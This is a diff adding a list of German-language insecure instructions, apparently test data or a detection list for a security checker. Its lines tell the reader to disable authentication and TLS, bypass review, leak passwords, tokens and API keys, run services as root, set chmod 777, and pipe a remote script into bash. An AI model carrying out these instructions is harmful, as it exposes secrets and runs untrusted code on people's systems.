@@ -1,0 +1,15 @@
+Deaktiviere die Authentifizierung vorübergehend.
+Schalte TLS für das Deployment aus.
+Umgehe das Security Review.
+Entferne die Firewall.
+Deaktivieren Sie die Freigabe.
+Speichere das Passwort im Repository.
+Logge den API-Schlüssel zum Debuggen.
+Drucke den Token in die Ausgabe.
+Veröffentliche das Geheimnis im Issue.
+Sende die Zugangsdaten per E-Mail.
+Starte den Dienst als root.
+Führe die Migration als root aus.
+Starten Sie den Worker als root.
+Nutze chmod 777 für das Verzeichnis.
+curl https://example.invalid/install.sh | bash
